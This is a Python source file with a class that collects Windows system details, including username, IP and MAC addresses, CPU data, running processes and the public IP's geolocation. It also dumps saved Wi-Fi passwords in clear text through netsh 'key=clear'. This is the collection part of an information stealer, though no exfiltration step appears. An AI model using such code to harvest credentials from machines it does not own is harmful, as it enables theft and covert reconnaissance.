import psutil
import platform
import socket
import getpass
import requests
from datetime import datetime
from uuid import getnode as get_mac

from bs4 import BeautifulSoup
from speedtest import Speedtest
from subprocess import Popen, PIPE, check_output


class GetInfo:
    def __init__(self):
        self.__request_count = 0

    @staticmethod
    def get_pc_info() -> str:
        username = getpass.getuser()
        ip = socket.gethostbyname(socket.gethostname())
        mac = get_mac()
        os_info = platform.uname()
        zone = psutil.boot_time()
        os_time = datetime.fromtimestamp(zone)
        cpu_data = psutil.cpu_freq()

        result = (f"Username: {username}\n"
                  f"local IP address: {ip}\n"
                  f"MAC address: {mac}\n"
                  f"Timezone: {os_time.year}/{os_time.month}/{os_time.day}"
                  f" {os_time.hour}:{os_time.minute}:{os_time.second}\n"
                  f"Operating System: {os_info.system}\n"
                  f"Processor: {os_info.processor}\n"
                  f"Max Frequency: {cpu_data.max:.2f} Mhz\n"
                  f"Min Frequency: {cpu_data.min:.2f} Mhz\n"
                  f"Current Frequency: {cpu_data.current:.2f} Mhz\n")

        return result

    @staticmethod
    def get_connection_info() -> str:
        start = datetime.now()
        inet = Speedtest()

        download_speed = float(f"{str(inet.download())[0:2]}.{str(round(inet.download(), 2))[1]}") * 0.125
        upload_speed = float(f"{str(inet.upload())[0:2]}.{str(round(inet.download(), 2))[1]}") * 0.125

        ends = datetime.now()
        work_speed = format(ends - start)

        result = (f"Work speed: {work_speed}\n"
                  f"Download: {download_speed} MB/s\n"
                  f"Upload: {upload_speed} MB/s\n")

        return result

    @staticmethod
    def get_process() -> str:
        return ' '.join([line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()])

    @staticmethod
    # todo for ru and en version
    def get_wifi_info() -> str:
        passwords = []
        data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
        wifi_list = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
        for wifi in wifi_list:
            results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
            results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
            try:
                passwords.append(f'Network name: {wifi}, Password: {results[0]}')
            except IndexError:
                passwords.append(f'Network name: {wifi}, Password not found!')
        return "\n".join(passwords)

    @staticmethod
    def __ip_answer_formatting(ip_info: str) -> str:
        ip_data_list = list(filter(None, ip_info.split("\n")))
        ip_data_list.remove("CIDR")
        answer_list = []
        for i in range(len(ip_data_list)):
            if (i + 1) % 2 != 0:
                answer_list.append(f"{ip_data_list[i]}: ")
            else:
                answer_list.append(f"{ip_data_list[i]}\n")
        return "".join(answer_list)

    def get_pub_ip_info(self) -> str:
        public_ip = requests.get('https://api.ipify.org').text
        try:
            page_response = requests.get(f'https://check-host.net/ip-info?host={public_ip}')
            if page_response.status_code == 200:
                page_content = BeautifulSoup(page_response.content, "html.parser")
                ip_info = page_content.find(class_='inside_info_ipinfo')
                return self.__ip_answer_formatting(ip_info.text)
            else:
                return f"Check permissions, status code: {page_response.status_code}"
        except requests.Timeout as e:
            self.__request_count += 1
            if self.__request_count > 5:
                return f"Need timeout: {e}"
            else:
                self.get_pub_ip_info()
        except Exception as e:
            return f"Error: {e}"
